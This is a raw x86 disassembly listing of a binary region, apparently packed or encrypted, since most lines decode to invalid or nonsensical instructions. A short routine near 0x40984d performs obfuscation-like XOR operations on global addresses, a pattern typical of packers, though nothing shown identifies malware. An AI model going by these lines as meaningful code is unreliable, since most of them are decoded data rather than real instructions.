  409587:	pop    edi
  409588:	pop    ecx
  409589:	jp     0x409541
  40958b:	in     al,dx
  40958c:	dec    eax
  40958d:	mov    esp,0x15368685
  409592:	xor    al,0x97
  409594:	xchg   edi,eax
  409595:	clc    
  409596:	mov    edx,0x46357d55
  40959b:	popa   
  40959c:	nop
  40959d:	mov    ah,0xb9
  40959f:	mov    edx,0xbf4e8669
  4095a4:	jbe    0x409619
  4095a6:	dec    eax
  4095a7:	pop    ds
  4095a8:	(bad)  
  4095aa:	and    eax,0x98445ac6
  4095af:	mov    ebp,0xde69e265
  4095b4:	mov    ebp,0x54f3a123
  4095b9:	jno    0x409597
  4095bb:	mov    ecx,0x1d1c7e9c
  4095c0:	xchg   edx,eax
  4095c1:	jge    0x409642
  4095c3:	test   al,0x37
  4095c5:	push   ebx
  4095c6:	pop    esi
  4095c7:	mov    bl,0x2f
  4095c9:	xor    BYTE PTR [edx-0x29],bh
  4095cc:	mov    esp,0x50c2f18f
  4095d1:	ins    DWORD PTR es:[edi],dx
  4095d2:	popf   
  4095d3:	add    bl,al
  4095d5:	xor    eax,0x2fd2e6df
  4095da:	xchg   esp,eax
  4095db:	cmp    DWORD PTR [ecx-0x4a8230d5],ebx
  4095e1:	out    dx,eax
  4095e2:	push   0xf2b60ec5
  4095e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4095e8:	pusha  
  4095e9:	mov    cl,0xe8
  4095eb:	and    ch,dl
  4095ed:	(bad)  
  4095ee:	(bad)  
  4095ef:	jmp    0x409836
  4095f4:	loope  0x40958c
  4095f6:	jmp    0x3d73:0xf1606904
  4095fd:	clc    
  4095fe:	jmp    0x8ea7:0x44e41b4e
  409605:	fstp   TBYTE PTR [esi+0x7e]
  409608:	and    al,0x7c
  40960a:	jle    0x40968a
  40960c:	inc    esp
  40960d:	cmp    ebp,DWORD PTR [esi-0x2f]
  409610:	clc    
  409611:	arpl   WORD PTR [ebx],ax
  409613:	in     al,dx
  409614:	aad    0x21
  409616:	fcomp  QWORD PTR [ebx+0x59]
  409619:	and    BYTE PTR [ecx+ebx*8+0x4e],bl
  40961d:	mov    edx,0xef9fc80
  409622:	push   edx
  409623:	inc    ecx
  409624:	add    bh,BYTE PTR [edi]
  409626:	jbe    0x409625
  409628:	pusha  
  409629:	cmp    esp,DWORD PTR [eax-0x24]
  40962c:	push   cs
  40962d:	dec    edi
  40962e:	jge    0x409687
  409630:	sbb    BYTE PTR [esi+0x63],dl
  409633:	adc    cl,0xe2
  409636:	outs   dx,DWORD PTR ds:[esi]
  409637:	sbb    DWORD PTR [ecx],ebp
  409639:	shr    ebp,0x5e
  40963c:	and    eax,0xbc21e5ae
  409641:	xor    BYTE PTR [ebp+esi*8-0xfe46762],al
  409648:	dec    esi
  409649:	clc    
  40964a:	pop    ss
  40964b:	pop    ebx
  40964c:	xor    dh,BYTE PTR [ebp+0x509f1fd6]
  409652:	lods   al,BYTE PTR ds:[esi]
  409653:	fldcw  WORD PTR [edi+0x736611e2]
  409659:	push   edi
  40965a:	push   edi
  40965b:	jecxz  0x409606
  40965d:	cli    
  40965e:	jg     0x4095e8
  409660:	mov    ebx,0xa40d9a33
  409665:	inc    ebx
  409666:	js     0x409634
  409668:	aas    
  409669:	call   0x5a2924b0
  40966e:	es dec ecx
  409670:	jo     0x409609
  409672:	adc    ebp,DWORD PTR [ebx-0x87a0f0b]
  409678:	in     eax,dx
  409679:	cmp    DWORD PTR [ecx-0x38],ebp
  40967c:	stc    
  40967d:	fstp   DWORD PTR [esi-0x3f]
  409680:	fisubr WORD PTR [ebp-0x12]
  409683:	test   BYTE PTR [edi-0x2ba1f12a],bl
  409689:	mov    al,0xff
  40968b:	inc    eax
  40968c:	mov    al,ds:0x63dac408
  409691:	imul   esp,edi,0xc2cbe179
  409697:	xor    eax,0xa21b7a9b
  40969c:	adc    DWORD PTR [edx],edx
  40969e:	(bad)  
  40969f:	call   DWORD PTR [ecx+0x2b]
  4096a2:	push   ds
  4096a3:	push   cs
  4096a4:	xchg   esi,eax
  4096a5:	cmc    
  4096a6:	push   esp
  4096a7:	nop
  4096a8:	(bad)  
  4096a9:	push   ss
  4096aa:	add    al,0xd0
  4096ac:	sbb    ebp,eax
  4096ae:	inc    esp
  4096af:	imul   esi,DWORD PTR [edi+eax*1-0x3db77009],0x62
  4096b7:	xor    ebp,0xb31305fb
  4096bd:	iret   
  4096be:	cmp    al,0x9c
  4096c0:	les    ebx,FWORD PTR [edx+0x41f45357]
  4096c6:	fstp   DWORD PTR ds:[esi-0x3e]
  4096ca:	pop    esi
  4096cb:	aam    0x3f
  4096cd:	fmulp  st(7),st
  4096cf:	inc    ebp
  4096d0:	xlat   BYTE PTR ds:[ebx]
  4096d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096d2:	fwait
  4096d3:	test   al,0xe9
  4096d5:	outs   dx,DWORD PTR ds:[esi]
  4096d6:	lea    eax,[eax]
  4096d8:	jne    0x409706
  4096da:	loop   0x409709
  4096dc:	(bad)  
  4096dd:	pop    edi
  4096de:	ret    
  4096df:	fmulp  st(4),st
  4096e1:	or     bl,dl
  4096e3:	mov    bh,0xfa
  4096e5:	loopne 0x409712
  4096e7:	rcl    BYTE PTR [esi+0x386d06c3],0x82
  4096ee:	mov    dl,bl
  4096f0:	sub    BYTE PTR [edx+0x6c],bh
  4096f3:	sbb    eax,0x3efb53d7
  4096f8:	xchg   edi,eax
  4096f9:	xor    DWORD PTR [edi-0x638f49a3],edx
  4096ff:	adc    al,0x89
  409701:	loope  0x409726
  409703:	sub    bh,BYTE PTR [esi]
  409705:	fst    DWORD PTR [esi]
  409707:	mov    esi,0x88e8c59e
  40970c:	pop    esi
  40970d:	inc    ecx
  40970e:	es out dx,eax
  409710:	or     al,0xf0
  409712:	test   DWORD PTR [edx+0x48],ebp
  409715:	scas   al,BYTE PTR es:[edi]
  409716:	call   0xcf77:0x99be67a1
  40971d:	inc    esp
  40971e:	xchg   esp,eax
  40971f:	imul   edx,ebx,0x4d590703
  409725:	bound  ecx,QWORD PTR [ebx-0x7181e43f]
  40972b:	push   esi
  40972c:	mov    cl,BYTE PTR [ecx+0x4cd7fb6f]
  409732:	xor    bl,ah
  409734:	mov    eax,ds:0x89d9f57a
  409739:	sub    bl,cl
  40973b:	dec    ebx
  40973c:	jp     0x40979c
  40973e:	mov    bh,0x11
  409740:	xchg   DWORD PTR cs:[ebp-0x1],edx
  409744:	icebp  
  409745:	ficomp DWORD PTR [edi+edi*4+0x66d52769]
  40974c:	mov    ah,0x1d
  40974e:	xor    DWORD PTR [esi+0x2c],0x59e3d904
  409755:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409756:	push   edx
  409757:	test   eax,0xdc48b58c
  40975c:	mov    esi,0x334af8a3
  409761:	cmc    
  409762:	gs jae 0x40970d
  409765:	sub    BYTE PTR [edi],0x60
  409768:	push   esp
  409769:	and    eax,0xf353741b
  40976e:	sub    ax,0xebf1
  409772:	or     bl,BYTE PTR [edx+0x64070732]
  409778:	cmp    al,0xd7
  40977a:	or     eax,0x6d113c1
  40977f:	test   eax,0x4c46ce13
  409784:	(bad)
  409787:	pop    ecx
  409788:	push   edi
  409789:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40978a:	shr    BYTE PTR fs:[edx+0x5],cl
  40978e:	sbb    dh,BYTE PTR [ebx-0x58]
  409791:	jne    0x4097a9
  409793:	(bad)  
  409794:	dec    BYTE PTR cs:[esi-0x1673d65f]
  40979b:	xchg   esp,eax
  40979c:	sub    eax,0x5b37d596
  4097a1:	and    DWORD PTR [edx+0x4fbfd83f],ebp
  4097a7:	loope  0x40972f
  4097a9:	pop    es
  4097aa:	scas   al,BYTE PTR es:[edi]
  4097ab:	arpl   sp,sp
  4097ad:	push   edx
  4097ae:	es (bad) 
  4097b0:	jno    0x40973c
  4097b2:	dec    esi
  4097b3:	pop    edx
  4097b4:	js     0x409832
  4097b6:	push   esp
  4097b7:	(bad)  
  4097b8:	retf   
  4097b9:	pop    ds
  4097ba:	mov    es,WORD PTR [edx]
  4097bc:	rol    ebp,cl
  4097be:	adc    BYTE PTR [ecx+ebx*8+0x676f9fb0],ah
  4097c5:	fnsave [edx-0x6c]
  4097c8:	mov    al,0xb4
  4097ca:	rcr    DWORD PTR [eax+0x7791c1c4],1
  4097d0:	cdq    
  4097d1:	repnz fmul DWORD PTR ds:0x87a329df
  4097d8:	sbb    eax,0x5e4b628c
  4097dd:	fdivr  DWORD PTR [eax+eiz*2+0x372a382]
  4097e4:	jmp    0xd9a4b377
  4097e9:	call   edi
  4097eb:	sbb    ah,BYTE PTR [eax+eiz*1+0xc]
  4097ef:	mov    ds,WORD PTR [edi]
  4097f1:	pop    ebp
  4097f2:	stc    
  4097f3:	cmp    dh,BYTE PTR [ebx-0x510e7e53]
  4097f9:	xchg   cl,cl
  4097fb:	dec    edi
  4097fc:	jecxz  0x409838
  4097fe:	in     ax,dx
  409800:	xor    DWORD PTR [ecx+0x63145c02],0x54d9a32d
  40980a:	and    edx,DWORD PTR [edx-0xb]
  40980d:	ins    DWORD PTR es:[edi],dx
  40980e:	clc    
  40980f:	mov    ch,0x77
  409811:	nop
  409812:	pop    edx
  409813:	(bad)
  409816:	gs jmp 0x4097d5
  409819:	pop    esi
  40981a:	pop    ebx
  40981b:	mul    DWORD PTR [esp+ebp*8-0xe6d41fa]
  409822:	adc    edi,DWORD PTR [ebx]
  409824:	or     DWORD PTR [eax+ecx*1],edi
  409827:	iret   
  409828:	(bad)  
  409829:	jmp    0x5248:0x7f0b3b97
  409830:	(bad)
  409834:	xchg   edi,eax
  409835:	or     cl,BYTE PTR [ebx-0x3cc40bbb]
  40983b:	je     0x40892f
  409841:	mov    eax,DWORD PTR [ebp-0x8]
  409844:	mov    eax,DWORD PTR [eax]
  409846:	pop    edi
  409847:	pop    esi
  409848:	pop    ebx
  409849:	leave  
  40984a:	ret    0xc
  40984d:	push   ebp
  40984e:	mov    ebp,esp
  409850:	sub    esp,0x30
  409853:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40985a:	add    ecx,0x13ba
  409860:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  409867:	xor    ecx,ecx
  409869:	xor    ecx,DWORD PTR ds:0x43385f
  40986f:	xor    DWORD PTR ds:0x433797,ecx
  409875:	mov    ecx,DWORD PTR [ebp-0x4]
  409878:	push   ebx
  409879:	sub    eax,eax
  40987b:	mov    eax,0x7510854
  409880:	add    DWORD PTR ds:0x43385b,0x43382b
  40988a:	xor    ecx,eax
  40988c:	mov    ebx,0x32729b
  409891:	add    ecx,ebx
  409893:	or     DWORD PTR ds:0x4337e7,0x433893
  40989d:	mov    DWORD PTR [ebp-0x1c],ecx
  4098a0:	mov    ecx,DWORD PTR ds:0x43377b
  4098a6:	sub    DWORD PTR ds:0x43385f,ecx
  4098ac:	mov    ecx,DWORD PTR [ebp+0x14]
  4098af:	jmp    0x409b12
  4098b4:	shr    DWORD PTR [ebx+0x7570c4c2],0xc1
  4098bb:	stos   DWORD PTR es:[edi],eax
  4098bc:	fadd   st(6),st
  4098be:	cwde   
  4098bf:	pushf  
  4098c0:	je     0x4098bb
  4098c2:	(bad)  
  4098c3:	ins    BYTE PTR es:[edi],dx
  4098c4:	mov    ah,0xd9
  4098c6:	jle    0x409946
  4098c8:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  4098cc:	pop    ebx
  4098cd:	inc    ebp
  4098ce:	ins    DWORD PTR es:[edi],dx
  4098cf:	push   ecx
  4098d0:	xor    ebp,DWORD PTR [eax-0x6e]
  4098d3:	cdq    
  4098d4:	iret   
  4098d5:	(bad)  
  4098d6:	fwait
  4098d7:	or     al,0xe6
  4098d9:	jae    0x40990c
  4098db:	inc    eax
  4098dc:	sub    DWORD PTR [edx+0x713b1ad6],eax
  4098e2:	or     ah,0x4f
  4098e5:	mov    edi,0x2916f2eb
  4098ea:	imul   edi,DWORD PTR [ebx],0xffffffb8
  4098ed:	(bad)  
  4098ee:	push   ebp
  4098ef:	xchg   DWORD PTR [ebx],edx
  4098f1:	lods   al,BYTE PTR ds:[esi]
  4098f2:	xchg   ecx,eax
  4098f4:	lds    edi,FWORD PTR [eax+0x522a36a1]
  4098fa:	test   BYTE PTR [edx+0x1865cff6],cl
  409900:	popa   
  409901:	mov    esi,0x2d842801
  409906:	gs dec esi
  409908:	sub    eax,0x8bee4616
  40990d:	jecxz  0x409934
  40990f:	jns    0x4098af
  409911:	enter  0x24c8,0x27
  409915:	or     ebx,DWORD PTR [esi+0x67]
  409918:	add    ebx,ebx
  40991a:	fstp   TBYTE PTR [ebx+0x7159d644]
  409920:	sbb    dh,BYTE PTR [ecx-0x75]
  409923:	cmp    dh,BYTE PTR [ebx+edx*4-0x28b650df]
  40992a:	dec    esp
  40992b:	fnsave [esi]
  40992d:	mov    ecx,0x44e105a0
  409932:	stos   DWORD PTR es:[edi],eax
  409933:	inc    esp
  409934:	xchg   ebx,eax
  409935:	xor    BYTE PTR [ebx*8+0x517fd039],cl
  40993c:	mov    ds:0xe459d5df,al
  409941:	shl    DWORD PTR [edi-0x6e],1
  409944:	xor    DWORD PTR [eax+0x383ea61a],0x5208a573
  40994e:	ret    
  40994f:	movsx  ebp,BYTE PTR [ecx]
  409952:	mov    esp,0x7304de18
  409957:	pop    esp
  409958:	pop    es
  409959:	add    edi,esp
  40995b:	jle    0x4099cd
  40995d:	cs jbe 0x40991d
  409960:	jmp    0x409923
  409962:	inc    ebx
  409963:	sbb    DWORD PTR [edx-0x4ea06a21],esi
  409969:	jb     0x409971
  40996b:	ins    BYTE PTR es:[edi],dx
  40996c:	cmp    BYTE PTR [eax+ebx*1],bh
  40996f:	cmp    BYTE PTR [edi+0x3c1cb49f],0x9a
  409976:	call   0xbc72840a
  40997b:	pop    ss
  40997c:	mov    ah,0xaa
  40997e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40997f:	sbb    edx,esp
  409981:	jo     0x409932
  409983:	or     al,0xe4
  409985:	fdiv   DWORD PTR [eax+0x9]
  409988:	add    eax,0x36e8f763
  40998d:	push   ecx
  40998e:	leave  
  40998f:	jp     0x409911
  409991:	jmp    0x4099c4
  409993:	cmovno ecx,DWORD PTR [ecx]
  409996:	cmp    DWORD PTR [ebx-0x14],ebp
  409999:	xor    dh,BYTE PTR [ebx]
  40999b:	jnp    0x409975
  40999d:	popa   
  40999e:	rcr    DWORD PTR [ebp-0x5f],cl
  4099a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4099a2:	inc    ebx
  4099a3:	mov    al,0x2b
  4099a5:	dec    ebp
  4099a6:	sub    al,BYTE PTR [edx+ecx*1]
  4099a9:	call   0x8191fce9
  4099ae:	stc    
  4099af:	push   ebp
  4099b0:	call   FWORD PTR [esi]
  4099b2:	call   DWORD PTR [ecx]
  4099b4:	fistp  DWORD PTR [eax+0xf]
  4099b7:	test   eax,0xab4230ca
  4099bc:	pusha  
  4099bd:	push   ds
  4099be:	out    dx,eax
  4099bf:	pop    eax
  4099c0:	and    al,0xdb
  4099c2:	mov    dl,0xc3
  4099c4:	lea    ebx,[eax+0x2d08e77d]
  4099ca:	jae    0x409984
  4099cc:	pop    esi
  4099cd:	xor    BYTE PTR [ebx-0x76],ch
  4099d0:	ret    0xdeeb
  4099d3:	(bad)  
  4099d4:	mov    bl,ch
  4099d6:	xchg   ecx,eax
  4099d7:	sub    DWORD PTR [edi+0x34ec55be],0x9977f613
  4099e1:	pusha  
  4099e2:	and    DWORD PTR [ecx+ebp*1],edi
  4099e5:	sbb    eax,0xe07dc47a
  4099ea:	nop
  4099eb:	pushf  
  4099ec:	mov    bl,0x91
  4099ee:	fidiv  WORD PTR [esi-0x23acd708]
  4099f4:	rcl    DWORD PTR [esi],cl
  4099f6:	xor    DWORD PTR [ebp+0x21213be3],esi
  4099fc:	loop   0x409a06
  4099fe:	mov    edi,DWORD PTR [edi]
  409a00:	cmp    eax,0xc6786885
  409a05:	dec    esp
  409a06:	jmp    0x7d9e37cc
  409a0b:	xchg   ebp,eax
  409a0c:	je     0x409a54
  409a0e:	jns    0x409a30
  409a10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a11:	mov    edi,0xa032dce8
  409a16:	nop
  409a17:	fst    QWORD PTR [ecx]
  409a19:	add    DWORD PTR [ebp+0x7e],ecx
  409a1c:	pop    esi
  409a1d:	clc    
  409a1e:	neg    DWORD PTR [eax]
  409a20:	sub    bh,cl
  409a22:	jg     0x4099c0
  409a24:	div    DWORD PTR [esi]
  409a26:	mov    bl,0x4a
  409a28:	call   DWORD PTR [edx]
  409a2a:	out    0x20,eax
  409a2c:	out    0xeb,al
  409a2e:	clc    
  409a2f:	mov    esi,0x9aa29934
  409a34:	mov    dh,0xf4
  409a36:	dec    ebp
  409a37:	mov    al,BYTE PTR [edx-0x4f]
  409a3a:	push   ebx
  409a3b:	xor    al,0x22
  409a3d:	int3   
  409a3e:	ins    BYTE PTR es:[edi],dx
  409a3f:	sbb    cl,dh
  409a41:	and    ch,BYTE PTR [ecx+0x3c]
  409a44:	push   edi
  409a45:	jg     0x409a50
  409a47:	and    DWORD PTR ds:0xcadb9955,ebx
  409a4d:	mov    edi,0xc0b80519
  409a52:	jo     0x409a03
  409a54:	mov    bh,0x5b
  409a56:	es loope 0x409a1c
  409a59:	ds push 0x69822df6
  409a5f:	push   ss
  409a60:	xor    BYTE PTR [esi-0x59],dl
  409a63:	mov    dh,0xa3
  409a65:	dec    esi
  409a66:	or     eax,0xbbe4f8f
  409a6b:	inc    ebx
  409a6c:	outs   dx,BYTE PTR ds:[esi]
  409a6d:	imul   ebp,esp,0x44
  409a70:	dec    esi
  409a71:	dec    ebp
  409a72:	enter  0xe44b,0xca
  409a76:	jmp    0x409a81
  409a78:	lea    ebp,[ebx+0x63]
  409a7b:	xchg   edx,eax
  409a7c:	nop
  409a7d:	outs   dx,DWORD PTR ds:[esi]
  409a7e:	dec    esp
  409a7f:	cmp    al,0x42
  409a81:	stc    
  409a82:	pop    ds
  409a83:	retf   0x434b
  409a86:	mov    cl,0x29
  409a88:	stos   BYTE PTR es:[edi],al
  409a89:	les    ebx,FWORD PTR [edx+0x2c]
  409a8c:	retf   0x4af2
  409a8f:	sbb    BYTE PTR [ebx+0x20],ch
  409a92:	sub    al,0xdc
  409a94:	fs add dl,dl
  409a97:	push   esp
  409a98:	inc    esp
  409a99:	call   0x8ca1c251
  409a9e:	ja     0x409aad
  409aa0:	sbb    DWORD PTR [edx-0x414efcba],ebx
  409aa6:	retf   0x64f8
  409aa9:	ins    DWORD PTR es:[edi],dx
  409aaa:	mov    cl,0xd4
  409aac:	mov    BYTE PTR [edi-0x3b5ec7fe],ch
  409ab2:	loop   0x409a5b
  409ab4:	rol    DWORD PTR [ebx],1
  409ab6:	repnz ds addr16 add eax,0x629e9bdf
  409abe:	cmp    DWORD PTR [edi-0xb],edx
  409ac1:	enter  0xd639,0x9a
  409ac5:	jmp    0x43162666
  409aca:	and    al,0x76
  409acc:	popf   
  409acd:	icebp  
  409ace:	add    BYTE PTR [ecx],ch
  409ad0:	(bad)  [edi-0x6d3537f3]
  409ad6:	icebp  
  409ad7:	retf   
  409ad8:	sbb    eax,0xc49ef9dc
  409add:	and    edx,0xffffff8d
  409ae0:	ins    DWORD PTR es:[edi],dx
  409ae1:	dec    ecx
  409ae2:	push   ss
  409ae3:	scas   eax,DWORD PTR es:[edi]
  409ae4:	std    
  409ae5:	ret    
  409ae6:	sub    DWORD PTR [esi+0x70],0x45bdb0a7
  409aed:	popa   
  409aee:	in     eax,0x71
  409af0:	jl     0x409b5f
  409af2:	cli    
  409af3:	or     al,0xfe
  409af5:	xchg   ecx,eax
  409af6:	aam    0xdd
  409af8:	(bad)  
  409af9:	scas   al,BYTE PTR es:[edi]
  409afa:	lods   al,BYTE PTR ds:[esi]
  409afb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409afc:	hlt    
  409afd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409afe:	stos   DWORD PTR es:[edi],eax
  409aff:	pop    es
  409b00:	xor    BYTE PTR [ecx+0x7a1e45e0],bl
  409b06:	or     BYTE PTR [ebp-0x779927f6],cl
  409b0c:	adc    edi,DWORD PTR [ecx+ebx*4]
  409b0f:	cld    
  409b10:	loopne 0x409b44
  409b12:	push   esi
  409b13:	push   edi
  409b14:	sbb    DWORD PTR ds:0x43381f,0x4337d3
  409b1e:	jmp    0x409d81
  409b23:	lds    esp,FWORD PTR [edi-0x2e932d54]
  409b29:	popa   
  409b2a:	mov    cl,0x92
  409b2c:	fisttp QWORD PTR [edi-0x2fab562c]
  409b32:	jo     0x409bb2
  409b34:	in     al,0x7e
  409b36:	jle    0x409b70
  409b38:	jl     0x409bb8
  409b3a:	jle    0x409b3c
  409b3c:	mov    ds:0xe058336d,eax
  409b41:	in     al,dx
  409b42:	jge    0x409bbb
  409b44:	rcl    DWORD PTR [esi+0x799f4161],0xe0
  409b4b:	and    ch,BYTE PTR [ecx-0x21102c0c]
  409b51:	shl    ch,0x10
  409b54:	out    dx,eax
  409b55:	fistp  WORD PTR [eax]
  409b57:	jl     0x409b55
  409b59:	test   al,0x7f
  409b5b:	loopne 0x409aff
  409b5d:	ret    
  409b5e:	retf   
  409b5f:	sub    ebx,ebp
  409b61:	jbe    0x409b66
  409b63:	adc    bl,BYTE PTR [ecx+0x68f6032d]
  409b69:	xchg   esi,eax
  409b6a:	fwait
  409b6b:	and    cl,dl
  409b6d:	out    dx,eax
  409b6e:	sub    DWORD PTR [ecx+0x7f],eax
  409b71:	mov    al,0x65
  409b73:	fwait
  409b74:	mov    bl,0x18
  409b76:	inc    ebx
  409b77:	je     0x409b17
  409b79:	jg     0x409b53
  409b7b:	loopne 0x409bcc
  409b7d:	leave  
  409b7e:	lock jae 0x409b94
  409b81:	data16 jne 0x409b83
  409b84:	push   edx
  409b85:	add    BYTE PTR [esi],cl
  409b87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b88:	lods   eax,DWORD PTR ds:[esi]
  409b89:	fsub   st(2),st
  409b8b:	fs xchg dh,cl
  409b8e:	ja     0x409b7a
  409b90:	repz sub BYTE PTR [esi+edx*8+0x728807ce],ah
  409b98:	xchg   ebx,eax
  409b99:	push   esp
  409b9a:	inc    ecx
  409b9b:	mov    WORD PTR [esp+edx*2],?
  409b9e:	sbb    BYTE PTR [ebx-0x6d207e],al
  409ba4:	sbb    ebp,ecx
  409ba6:	and    esi,esp
  409ba8:	jmp    0xda52:0x85ba6a01
  409baf:	cmp    al,0x81
  409bb1:	cmp    BYTE PTR [edx-0x3a],0xd6
  409bb5:	pop    eax
  409bb6:	cdq    
  409bb7:	out    0xc6,eax
  409bb9:	fs out dx,al
  409bbb:	stos   DWORD PTR es:[edi],eax
  409bbc:	popa   
  409bbd:	dec    ebx
  409bbe:	jle    0x409b74
  409bc0:	pusha  
  409bc1:	ins    DWORD PTR es:[edi],dx
  409bc2:	mov    ebp,0xb591f0b0
  409bc7:	fwait
  409bc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409bc9:	cmp    DWORD PTR [esi-0x7353dc53],edi
  409bcf:	inc    esi
  409bd0:	paddsw mm3,QWORD PTR [edx-0x5ce82e9b]
  409bd7:	pop    es
  409bd8:	xlat   BYTE PTR ds:[ebx]
  409bd9:	aam    0xf9
  409bdb:	mov    ah,0xe2
  409bdd:	cmp    ecx,DWORD PTR [ebx]
  409bdf:	test   ebp,esi
  409be1:	(bad)
  409be4:	enter  0x5294,0xb2
  409be8:	outs   dx,BYTE PTR ds:[esi]
  409be9:	data16 stc 
  409beb:	sahf   
  409bec:	mov    cl,0x2c
  409bee:	pushf  
  409bef:	sub    bl,BYTE PTR [ecx+0x258c41fa]
  409bf5:	mov    esp,0x74ce1b9b
  409bfa:	mov    bl,0x71
  409bfc:	aas    
  409bfd:	push   0xd3a873e5
  409c02:	je     0x409b87
  409c04:	sbb    al,0x91
  409c06:	scas   al,BYTE PTR es:[edi]
  409c07:	rol    BYTE PTR [edx+ebp*1+0x5f],0x54
  409c0c:	nop
  409c0d:	out    dx,eax
  409c0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c0f:	mov    BYTE PTR [edx+0x79],ch
  409c12:	sub    al,0xeb
  409c14:	fcmove st,st(5)
  409c16:	and    ecx,DWORD PTR [ecx+0x7f]
  409c19:	and    eax,0x9433d274
  409c1e:	clc    
  409c1f:	jns    0x409be1
  409c21:	cmp    edx,0x5de4ba3c
  409c27:	(bad)
  409c2a:	pop    ss
  409c2b:	cwde   
  409c2c:	into   
  409c2d:	test   DWORD PTR [ecx+0x64],ebx
  409c30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c31:	push   ebx
  409c32:	jns    0x409bc8
  409c34:	cmp    dh,BYTE PTR [edi-0x10bdac46]
  409c3a:	(bad)  
  409c3c:	mov    esp,0xd7b5383b
  409c41:	test   BYTE PTR es:[ecx-0x39bbf51e],cl
  409c48:	js     0x409ca5
  409c4a:	stc    
  409c4b:	out    dx,eax
  409c4c:	ins    BYTE PTR es:[edi],dx
  409c4d:	pop    esp
  409c4e:	or     BYTE PTR [eax-0x4b],0x81
  409c52:	call   0x7f7d:0xfa94d5ec
  409c59:	out    0xc4,al
  409c5b:	push   esp
  409c5c:	add    esi,edx
  409c5e:	addr16 jne 0x409c3b
  409c61:	stos   BYTE PTR es:[edi],al
  409c62:	sbb    BYTE PTR [edi+0x56ccff0f],ch
  409c68:	not    BYTE PTR [ecx+0x17ad9a3a]
  409c6e:	dec    esi
  409c6f:	(bad)  
  409c70:	int    0x3a
  409c72:	(bad)  
  409c74:	and    BYTE PTR [edi],bl
  409c76:	lods   eax,DWORD PTR ds:[esi]
  409c77:	jne    0x409c55
  409c79:	or     BYTE PTR [ebp-0x4f],cl
  409c7c:	loope  0x409ced
  409c7e:	mov    al,0x6e
  409c80:	test   al,0xff
  409c82:	cmp    ch,BYTE PTR [eax-0x2ce4cecf]
  409c88:	scas   eax,DWORD PTR es:[edi]
  409c89:	in     eax,dx
  409c8a:	out    dx,eax
  409c8b:	push   ebp
  409c8c:	adc    eax,DWORD PTR [ebx-0x5d]
  409c8f:	icebp  
  409c90:	pusha  
  409c91:	(bad)  
  409c92:	out    0x61,eax
  409c94:	jbe    0x409c43
  409c96:	loop   0x409c83
  409c98:	mov    al,ds:0x851242b3
  409c9d:	mov    ah,BYTE PTR [ecx-0x3f030ca5]
  409ca3:	jb     0x409ce1
  409ca5:	add    ebp,DWORD PTR [eax+0x51724d62]
  409cab:	xchg   esi,eax
  409cac:	outs   dx,DWORD PTR ds:[esi]
  409cad:	mov    ah,BYTE PTR [edi+0x44]
  409cb0:	push   0x5d504547
  409cb5:	call   DWORD PTR [esi]
  409cb7:	ret    
  409cb8:	pop    ebx
  409cb9:	adc    BYTE PTR [edx],ah
  409cbb:	scas   eax,DWORD PTR es:[edi]
  409cbc:	seta   ch
  409cbf:	pop    esi
  409cc0:	mov    cl,0x9b
  409cc2:	cmc    
  409cc3:	adc    esp,edx
  409cc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409cc6:	call   0x1034:0x202b999c
  409ccd:	(bad)  
  409cce:	jnp    0x409cea
  409cd0:	jo     0x409cf4
  409cd2:	test   DWORD PTR [esi-0x6d],esp
  409cd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409cd6:	mov    edx,0x8d6ccd73
  409cdb:	hlt    
  409cdc:	and    al,0x50
  409cde:	xchg   BYTE PTR [ecx-0x7c08f1bc],bl
  409ce4:	inc    ebp
  409ce5:	xchg   ebp,eax
  409ce6:	(bad)  
  409ce8:	pop    edx
  409ce9:	xchg   ebx,eax
  409cea:	mov    dh,0xbb
  409cec:	mov    dh,0x1e
  409cee:	les    edi,FWORD PTR [ebx+0x5f148d78]
  409cf4:	xchg   edi,eax
  409cf5:	ficomp WORD PTR [edx]
  409cf7:	pop    ebp
  409cf8:	push   ebx
  409cf9:	sub    al,0x30
  409cfb:	shr    cl,cl
  409cfd:	rcr    edi,1
  409cff:	into   
  409d00:	mov    dl,0x64
  409d02:	pop    ds
  409d03:	mov    ebx,0xae20d9d3
  409d08:	mov    eax,ds:0xa58fb091
  409d0d:	rcl    BYTE PTR [ecx],cl
  409d0f:	ror    BYTE PTR [edx-0x5519cd9a],1
  409d15:	pop    esi
  409d16:	rcr    ch,cl
  409d18:	inc    ebx
  409d19:	adc    DWORD PTR [edx+0x3a],ebx
  409d1c:	pop    ds
  409d1d:	jne    0xac1a0165
  409d23:	cld    
  409d24:	pop    ebx
  409d25:	add    BYTE PTR [esi],dh
  409d27:	and    bh,BYTE PTR [ecx+0x6e]
  409d2a:	adc    BYTE PTR [edx+edx*2+0x67f7de3d],bh
  409d31:	jnp    0x409da4
  409d33:	lods   al,BYTE PTR ds:[esi]
  409d34:	mov    DWORD PTR [edx+0x22],edx
  409d37:	sub    ecx,DWORD PTR [edx-0x8]
  409d3a:	icebp  
  409d3b:	int    0xe7
  409d3d:	fdivr  DWORD PTR es:[ebx-0x35]
  409d41:	repz imul ecx,DWORD PTR [ebx-0x6c],0xd9a890ba
  409d49:	in     al,dx
  409d4a:	xor    al,0x81
  409d4c:	shr    DWORD PTR [ebp+0x4f],1
  409d4f:	or     eax,0x48f4ff63
  409d54:	pop    es
  409d55:	leave  
  409d56:	(bad)  
  409d57:	rol    DWORD PTR [esi-0x5c],1
  409d5a:	xor    cl,BYTE PTR [edi-0x1b]
  409d5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
